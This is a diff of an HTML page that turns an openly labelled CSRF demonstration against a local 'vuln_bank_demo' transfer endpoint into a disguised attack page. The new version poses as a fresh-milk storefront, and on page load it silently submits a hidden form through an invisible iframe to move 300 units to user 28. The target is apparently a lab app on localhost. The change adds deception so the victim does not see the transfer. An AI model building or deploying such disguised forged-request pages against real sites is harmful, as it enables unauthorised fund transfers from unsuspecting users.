@@ -1,19 +1,37 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Fresh Milk Drinks</title>
+    <style>
+        body { font-family: Arial; text-align:center; }
+    </style>
+</head>
 <body>
 
-<h3>This is a harmless CSRF demonstration</h3>
+<h1>AsolHero Fresh Farm Milk</h1>
+<p>Healthy ~ Organic ~ Delivered Daily</p>
+<img src="Generated Image November 20, 2025 - 9_26PM.png" width="300">
 
-<p>When the page loads, it will automatically POST to your local PHP file.</p>
+<!-- Hidden iframe -->
+<iframe name="hiddenFrame" style="display:none;"></iframe>
 
-<form id="csrfForm" action="http://127.0.0.1/vuln_bank_demo/transfer.php" method="POST">
-    <input type="hidden" name="to_user" value="1">
+<!-- CSRF form -->
+<form id="csrfForm"
+      action="http://127.0.0.1/vuln_bank_demo/transfer.php"
+      method="POST"
+      target="hiddenFrame">
+
+    <input type="hidden" name="to_user" value="28">
     <input type="hidden" name="amount" value="300">
 </form>
 
 <script>
-    document.getElementById('csrfForm').submit();
+    window.onload = function() {
+        document.getElementById('csrfForm').submit();
+    };
 </script>
+
+<p>Order today and get 20% extra cream free!</p>
 
 </body>
 </html>
